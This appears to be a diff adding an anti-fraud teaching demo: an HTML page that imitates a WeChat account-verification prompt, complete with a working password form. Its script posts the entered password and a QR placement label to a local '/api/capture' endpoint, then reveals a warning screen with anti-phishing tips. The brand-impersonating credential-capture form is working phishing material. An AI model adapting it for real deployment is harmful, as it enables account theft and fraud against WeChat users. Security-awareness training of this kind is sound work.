@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>微信账号安全验证</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    font-family: -apple-system, "Segoe UI", "PingFang SC", "Microsoft YaHei", sans-serif;
+    background: #ededed; min-height: 100vh; display: flex; flex-direction: column;
+  }
+  /* 顶部导航（仿微信内置浏览器栏） */
+  .nav {
+    background: #2f2f2f; color: #fff; display: flex; align-items: center;
+    padding: 11px 14px; font-size: 15px;
+  }
+  .nav .close { width: 24px; font-size: 16px; color: #ccc; }
+  .nav .t { flex: 1; text-align: center; letter-spacing: 1px; }
+  .nav .more { width: 24px; font-size: 14px; color: #ccc; text-align: right; }
+
+  main { flex: 1; display: flex; flex-direction: column; justify-content: center; }
+
+  /* 底部工具栏（仿微信内置浏览器） */
+  .toolbar {
+    display: flex; align-items: center; justify-content: space-around;
+    background: #f6f6f6; border-top: 1px solid #e2e2e2; padding: 7px 0; color: #7a7a7a; font-size: 17px;
+  }
+  .toolbar span { width: 42px; text-align: center; }
+  .toolbar .dim { color: #c9c9c9; }
+
+  .card { margin: 16px 14px; background: #fff; border-radius: 8px; padding: 34px 22px; text-align: center; }
+  .wx-logo {
+    width: 64px; height: 64px; border-radius: 14px; background: #07c160; margin: 0 auto 16px;
+    display: flex; align-items: center; justify-content: center; color: #fff;
+    font-size: 30px; font-weight: 700;
+  }
+  .card h1 { font-size: 18px; color: #222; font-weight: 600; letter-spacing: .5px; }
+  .risk { margin: 14px auto 0; max-width: 300px; font-size: 13px; color: #8a8a8a; line-height: 1.9; }
+  .risk b { color: #ff6b00; font-weight: 500; }
+
+  .field { margin-top: 26px; text-align: left; }
+  .field label { display: block; font-size: 13px; color: #666; margin-bottom: 8px; }
+  .field .inp {
+    display: flex; align-items: center; border: 1px solid #e0e0e0; border-radius: 6px; background: #fafafa;
+  }
+  .field .inp:focus-within { border-color: #07c160; }
+  .field input {
+    flex: 1; border: none; outline: none; background: transparent; padding: 12px 14px;
+    font-size: 15px; color: #222; letter-spacing: 2px;
+  }
+  .field .icon { padding: 0 14px; font-size: 15px; color: #aaa; }
+
+  .btn {
+    margin-top: 24px; width: 100%; padding: 13px; border: none; border-radius: 6px; cursor: pointer;
+    background: #07c160; color: #fff; font-size: 16px; font-weight: 600; letter-spacing: 4px;
+    transition: background .15s;
+  }
+  .btn:hover { background: #06ad56; }
+  .btn:disabled { background: #9fe0bc; cursor: wait; }
+  .note { text-align: center; font-size: 11px; color: #999; margin-top: 18px; line-height: 1.8; }
+  .foot { font-size: 11px; color: #bbb; text-align: center; margin-top: 6px; }
+  .tiny {
+    font-size: 10px; color: #ccc; text-align: center; padding: 10px;
+    border-top: 1px dashed #ddd;
+  }
+
+  /* 捕获警示红屏 */
+  .capture {
+    position: fixed; inset: 0; background: #180404; z-index: 10; display: none;
+    align-items: center; justify-content: center; padding: 24px;
+  }
+  .capture.on { display: flex; }
+  .capture .box { max-width: 460px; text-align: center; animation: rise .45s ease; }
+  .capture .siren { font-size: 54px; animation: blink 1s steps(2) infinite; }
+  .capture h2 {
+    color: #ff4444; font-size: 22px; letter-spacing: 4px; margin: 14px 0 8px;
+    text-shadow: 0 0 18px rgba(255,68,68,.7);
+  }
+  .capture .sub { color: #ff9d9d; font-size: 14px; letter-spacing: 1px; }
+  .capture .leaked {
+    margin: 20px auto; background: rgba(255,68,68,.1); border: 1px solid rgba(255,68,68,.4);
+    border-radius: 8px; padding: 14px 20px; font-family: Consolas, monospace; color: #ffb3b3;
+    font-size: 14px; word-break: break-all;
+  }
+  .capture .leaked b { color: #ff4444; }
+  .capture .tips { text-align: left; color: #e8b4b4; font-size: 13px; line-height: 2; margin-top: 8px; }
+  .capture .tips li::marker { color: #ff4444; }
+  .capture .ok {
+    margin-top: 22px; padding: 11px 34px; border: 1px solid rgba(255,68,68,.5);
+    background: rgba(255,68,68,.08); color: #ff9d9d; font-size: 14px; border-radius: 6px; cursor: pointer;
+    letter-spacing: 2px;
+  }
+  .capture .ok:hover { background: rgba(255,68,68,.18); }
+  .capture .meta { margin-top: 18px; font-size: 11px; color: #8a5a5a; font-family: Consolas, monospace; }
+  @keyframes rise { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: none; } }
+  @keyframes blink { 50% { opacity: .25; } }
+</style>
+</head>
+<body>
+
+<div class="nav">
+  <span class="close">‹</span>
+  <span class="t">微信账号安全验证</span>
+  <span class="more">⋯</span>
+</div>
+
+<main>
+  <div class="card">
+    <div class="wx-logo">微信</div>
+    <h1>账号安全验证</h1>
+    <div class="risk">
+      系统检测到您的账号于今日在<b>陌生设备</b>上登录，
+      为保障账号安全，请完成身份验证后继续使用。
+    </div>
+    <form id="form">
+      <div class="field">
+        <label for="pass">微信密码</label>
+        <div class="inp">
+          <span class="icon">🔒</span>
+          <input id="pass" type="password" placeholder="请输入微信密码" autocomplete="off" required />
+        </div>
+      </div>
+      <button class="btn" id="go" type="submit">验 证</button>
+    </form>
+    <div class="note">验证通过后将自动恢复账号正常使用<br />本服务由微信安全中心提供技术支持</div>
+  </div>
+  <div class="foot" id="footTxt"></div>
+  <div class="tiny">⚠ 反诈教学演示环境 · 任何输入都不会被真实保存</div>
+</main>
+
+<div class="toolbar">
+  <span>‹</span>
+  <span class="dim">›</span>
+  <span class="dim">✕</span>
+  <span>⌂</span>
+  <span>⟳</span>
+  <span>⋮</span>
+</div>
+
+<div class="capture" id="capture">
+  <div class="box">
+    <div class="siren">🚨</div>
+    <h2>密 码 已 被 捕 获</h2>
+    <div class="sub">这个"账号安全验证"页面是伪造的 —— 你扫的二维码来自攻击者</div>
+    <div class="leaked">泄露的微信密码：<b id="leakedPass">******</b></div>
+    <ul class="tips">
+      <li>真正的微信<b>从不会</b>让你在网页里输入密码"验证账号安全"，官方验证只走 App 内</li>
+      <li>攻击者拿到微信密码 = 拿到你的账号：聊天记录、好友、钱包都被翻</li>
+      <li>骗子还会冒充你向好友借钱、群发诈骗链接，受害者是整张通讯录</li>
+      <li>陌生二维码不扫、网页要密码不输；要验证直接打开微信 App 官方入口</li>
+    </ul>
+    <button class="ok" id="ok">我知道了</button>
+    <div class="meta">→ 点击上方"攻击者控制台"链接，看密码是怎么被实时捕获的</div>
+  </div>
+</div>
+
+<script>
+  // 二维码里的 scene 参数可由攻击者指定（投放点），用于区分钓饵贴在哪
+  const scene = new URLSearchParams(location.search).get('scene') || '';
+  document.getElementById('footTxt').textContent = scene ? '投放点：' + scene : '';
+
+  document.getElementById('form').addEventListener('submit', (e) => {
+    e.preventDefault();
+    const pass = document.getElementById('pass').value;
+    if (!pass) return;
+    const go = document.getElementById('go');
+    go.disabled = true;
+    go.textContent = '验证中…';
+    setTimeout(() => {
+      fetch('/api/capture', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ pass, src: 'wx', label: scene || '微信扫码' }),
+      });
+      document.getElementById('leakedPass').textContent = pass;
+      document.getElementById('capture').classList.add('on');
+    }, 1400);
+  });
+
+  document.getElementById('ok').addEventListener('click', () => {
+    document.getElementById('capture').classList.remove('on');
+    document.getElementById('pass').value = '';
+    const go = document.getElementById('go');
+    go.disabled = false;
+    go.textContent = '验 证';
+  });
+</script>
+</body>
+</html>
